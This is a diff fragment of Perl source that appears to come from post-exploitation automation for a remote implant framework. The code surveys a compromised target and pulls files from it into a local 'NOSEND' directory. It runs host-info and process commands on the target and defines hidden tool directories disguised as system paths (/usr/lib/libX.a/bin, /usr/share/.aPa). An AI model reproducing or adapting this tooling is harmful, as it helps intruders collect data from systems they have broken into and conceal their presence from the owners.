+	writefile("$optmp/getscaldwedfile.$$",$newdoneoutput);
+	nopenlss("-LNOSEND/var/tmp","-rGYl$optmp/getscaldwedfile.$$");
+	mydo("autoproblem","-TDEV",
+             "\n\nThis may be a SCALDWED Monitor file:\n\n".
+             $newdoneoutput."\n\n".
+             "It has been pulled and put in the NOSEND directory for this target:\n\n".
+             `find $opdown/NOSEND/$nopen_rhostname/var/tmp -type f -ls`);
+	my ($ans) = mygetinput
+	    (
+	     "\n .\n .\n .\n .\n .\n .\n .\n .\n .\n .\n .\n .".$COLOR_NORMAL.
+	     "\n\n\n$COLOR_FAILURE   ALERT   ALERT   ALERT   ALERT   ALERT   ALERT   ALERT   ALERT\n".
+	     "$COLOR_NORMAL\n\n".
+	     "This may be a SCALDWED Monitor file:\n\n".
+	     $newdoneoutput."\n\n".
+	     "It has been pulled and put in the NOSEND directory for this target:\n\n".
+	     `find $opdown/NOSEND/$nopen_rhostname/var/tmp -type f -ls`.
+	     "\n\n\nFurther, the problem has already been logged here, no need to do anything else:\n\n".
+	     `ls -arlt $opdown/DEV-problems.log`.
+	     "\n\n\n$COLOR_FAILURE   ALERT   ALERT   ALERT   ALERT   ALERT   ALERT   ALERT   ALERT\n".
+	     "$COLOR_NORMAL\n\n".
+	     "\n .\n .\n .\n .\n .\n .\n .\n .\n .\n .\n .\n .".
+#	     "Paste the content between and including the ALERT lines above into your\n".
+#	     "opnotes.\n\n".
+	     "Hit return to continue with autonewdone.".
+	     "");
+    }
+
+    # Run this only on suitable targets.
+    if ($linuxtarget or $solaristarget or $freebsdtarget) {
+	mydo("autogetnewsuc");
+    }
+    
+    tickleifneedbe($builtinsonly);
+    
+    ($redo,$thismonth,$today,$thismonthfiles,$todayfiles) =
+	whendo("autonewdone","DONE",$thismonth,$today);
+    
+    doit("-lsh rm -f $opetc/nopen_auto.$nopen_mypid");
+    myalert("NOLOGGING","DONE running $opetc/autonewdone on $nopen_rhostname");
+    
+    doit("-lsh [ -f /current/tmp/$nopen_mypid.namefix ] && source /current/tmp/$nopen_mypid.namefix ; date -u ; $opetc/gethostinfo.pl | grep -v \"^Malformed UTF-8\" | tee $opdown/hostinfo.$nopen_rhostname ; echo -e \"${COLOR_FAILURE}Use \\\"-hostinfo\\\" to see hostinfo pop-up window${COLOR_NORMAL}\"",
+	 ) unless $autonohostinfo;
+    
+    ($output) = doit("-w");
+    unless ($builtinsonly) {
+	($output) = doitwrite("w");
+    }
+    filepopup("$opdown/ps.$nopen_rhostname",
+	      "-geometry 183x72-101-0 -title \"autonewdone ps.$nopen_rhostname\""
+	      ) unless ($autoforce or $today or $thismonth);
+    
+    if ($output) {
+	newhostvar("host_wuptime{$nopen_rhostname}",$output);
+	if (open(WOUT,">$optargetcommands/${nopen_rhostname}_wuptime")) {
+	    print WOUT $output;
+	    close(WOUT);
+	}
+    }
+    return 1;
+}
+
+sub logdoit {
+    my $returnoutput = "";
+    foreach my $line (@_) {
+	my ($logoutput,$lognopenlines,@logoutput) = ();
+	if ($line =~ m,^\-,) {
+	    ($logoutput,$lognopenlines,@logoutput) = doit($line);
+	} else {
+	    ($logoutput,$lognopenlines,@logoutput) = doitwrite($line);
+	}
+	$returnoutput .= $logoutput;
+	print CMDOUT $lognopenlines;
+	print CMDOUT $logoutput;
+    }
+    return $returnoutput;
+}
+
+sub myinit {
+  # If $willautoport is already defined, we must have been called
+  # by another script via require. We do not re-do autoport stuff.
+  $calledviarequire = 0;
+  if ($willautoport and $socket) {
+    progprint("$prog called -gs newdone @ARGV");
+    $calledviarequire = 1;
+  } else {
+    $willautoport=1;
+    my $autoutils = "../etc/autoutils" ;
+    unless (-e $autoutils) {
+      $autoutils = "/current/etc/autoutils" ;
+    }
+    require $autoutils;
+    $prog = "-gs newdone";
+    $vertext = "$prog version $VER\n" ;
+    mydie("No user servicable parts inside.\n".
+	  "(I.e., noclient calls $prog, not you.)\n".
+	  "$vertext") unless ($nopen_rhostname and $nopen_mylog and
+			      -e $nopen_mylog);
+  }
+
+  # Setting $autodone allows any mydo() called functions to know
+  # we are in this mode to populate $opdir/latewarnings*
+  $autodone=1;
+
+  # We define out hackdirs here.
+  @hackdirs = ("/usr/lib/libX.a/bin","/usr/share/.aPa","/usr/share/.aPa/bin");
+
+  # This is a fresh instance; previous failed newdones may have
+  # issued warnings we are about to repeat, so just dump them.
+  unlink("$opdir/latewarnings.$nopen_rhostname");
+
+  # If $socket is already defined, we must have been called
+  # by another script via require. We do not re-do autoport stuff.
+  $socket = pilotstart(quiet) unless $socket;
+
+  ($redo,$thismonth,$today,$thismonthfiles,$todayfiles) =
+    whendo("autonewdone");
+dbg("BACK IN autonewdone, just called whendo:
+
+ARGS=(@ARGS)   after whendo(@_) with
+      finished=$finished=
+    yearmonstr=$yearmonstr=
+      todaystr=$todaystr=
+     autoforce=$autoforce=
+       autoyes=$autoyes=
+     autoreget=$autoreget=
+ nopenlssreget=$nopenlssreget=
+     autoshort=$autoshort=
+autonohostinfo=$autonohostinfo=
+
+RETURN:   redo=$redo,
+     thismonth=$thismonth,
+         today=$today,
+thismonthfiles=$thismonthfiles,
+    todayfiles=$todayfiles,
+
+");
+
+}#myinit
+
